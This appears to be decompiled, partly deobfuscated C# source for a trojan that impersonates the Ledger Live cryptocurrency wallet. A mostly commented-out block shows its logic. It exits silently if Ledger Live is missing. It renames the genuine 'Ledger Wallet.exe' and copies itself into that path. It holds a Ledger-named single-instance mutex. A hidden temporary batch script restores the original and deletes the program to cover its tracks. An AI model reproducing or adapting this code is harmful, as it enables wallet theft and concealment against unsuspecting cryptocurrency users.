using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
//using ObfuscatedSupportNamespace;
using Ledger.otherUseless;


namespace Ledger.MainClassFolder
{
    public static class MainClass
    {
        private static Mutex _mutex;
        public static string ledgerLivePath = "C:\\Program Files\\Ledger Live\\Ledger Wallet.exe";
        public static string ledgerConfPath = "C:\\Program Files\\Ledger Live\\LedgerConf.exe";
        public static string targetDir = "C:\\Program Files\\Ledger Live";


        [STAThread]
        private static void Main()
        {
            Application.Run((Form)new Second2Form()); // was ܟΗ\uFFFD\uFFFDܠᚺRכܩBΑOו unicode

            //Application.Run((Form)new MainFormBAOClass()); // was ܟΗ\uFFFD\uFFFDܠᚺRכܩBΑOו unicode
        }
    }
}
//            if (Environment.OSVersion.Version >= new Version(6, 3))
//                MainClass.SetProcessDpiAwarenessContext(34); // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode
//            string executablePath = Application.ExecutablePath;
//            string directoryName = Path.GetDirectoryName(executablePath);
//            if (!MainClass.IsAdmin()) // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode
//                ImageRedrawHelper.ReDrawWholeImages(); // was \uFFFDAΩ\uFFFDHᛈᚐLגᚐ unicode
//            string targetDir = MainClass.targetDir; // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode
//#if DEBUG
//            targetDir = directoryName; // pretend we're already in the right place
//#else
//            string targetDir = MainClass.targetDir;
//#endif
//            if (!directoryName.Equals(targetDir, StringComparison.OrdinalIgnoreCase))
//            {
//                try
//                {
//                    if (!Directory.Exists(MainClass.targetDir)) // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode
//                    {
//                        //CBImproved

//                        MainClass.SilentSelfDestruct(); // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode
//                    }
//                }
//                catch
//                {
//                    Environment.Exit(0);
//                    MainClass.SilentSelfDestruct();
//                }
//                finally
//                {
//                    Environment.Exit(0);
//                }
//            }



//            //if (File.Exists(MainClass.ledgerLivePath))
//            //{ // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode
//            //    File.Move(MainClass.ledgerLivePath, MainClass.ledgerConfPath);

//            //    File.Copy(executablePath, MainClass.ledgerLivePath, true);
//            //}
//            if (File.Exists(MainClass.ledgerLivePath) && !File.Exists(MainClass.ledgerConfPath))
//                File.Move(MainClass.ledgerLivePath, MainClass.ledgerConfPath);

//            if (!File.Exists(MainClass.ledgerLivePath))
//                File.Copy(executablePath, MainClass.ledgerLivePath, false);


            
//                try
//                {
//                    bool createdNew;
//                    MainClass._mutex = new Mutex(true, "Global\\LedgerLive_SingleInstance_Mutex", out createdNew); // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode
//                    if (!createdNew)
//                    {
//                        Environment.Exit(0);
//                    }
//                    else
//                    {
//                        Application.EnableVisualStyles();
//                        Application.SetCompatibleTextRenderingDefault(false);
//              //          Application.Run((Form)new MainFormBAOClass()); // was ܟΗ\uFFFD\uFFFDܠᚺRכܩBΑOו unicode
//                        try
//                        {
//                            /*if (!File.Exists(MainClass.ledgerConfPath)) // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode
//                                return;
//                            File.Delete(MainClass.ledgerLivePath); // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode
//                            File.Move(MainClass.ledgerConfPath, MainClass.ledgerLivePath); // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode*/
//                            MainClass.SilentSelfDestruct();
//                        }
//                        catch
//                        {
//                        }
//                    }
//                }
//                finally
//                {
//                    MainClass._mutex?.ReleaseMutex(); // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode
//                    MainClass._mutex?.Dispose(); // was \uFFFD\uD800\uDC2F\uFFFDΨ\uFFFDܕΑ\uFFFD\uD800\uDFA3\uFFFDᛊ unicode
//                }
            
//        }

//        public static bool IsAdmin()
//        {
//            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
//        }

//        private static void SilentSelfDestruct()
//        {
//            try
//            {
//                string contents = $@"
//@echo off
//chcp 65001 >nul
//if exist ""{MainClass.ledgerConfPath}"" (
//    del ""{MainClass.ledgerLivePath}"" 2>nul
//    move ""{MainClass.ledgerConfPath}"" ""{MainClass.ledgerLivePath}"" 2>nul
//)
//:loop
//del ""{Application.ExecutablePath}"" 2>nul
//if exist ""{Application.ExecutablePath}"" (
//    timeout /t 1 /nobreak >nul
//    goto loop
//)
//del ""%~f0""";
//                string path = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.bat");
//                File.WriteAllText(path, contents, Encoding.ASCII);
//                Process.Start(new ProcessStartInfo()
//                {
//                    FileName = "cmd.exe",
//                    Arguments = $"/C \"\"{path}\"\"",
//                    WindowStyle = ProcessWindowStyle.Hidden,
//                    CreateNoWindow = true,
//                    UseShellExecute = false
//                });
//            }
//            catch { }
//        }
//        [DllImport("user32.dll", SetLastError = true)]
//        private static extern bool SetProcessDpiAwarenessContext(int dpiFlag);

//        private enum DpiAwarenessContext // was \uFFFDH\uFFFD\uFFFD\uFFFDΩ\uFFFDΕܒᚃ\uFFFDY\uFFFD unicode
//        {
//            PerMonitorAwareV2 = 34, // 0x00000022
//        }
//    }
//}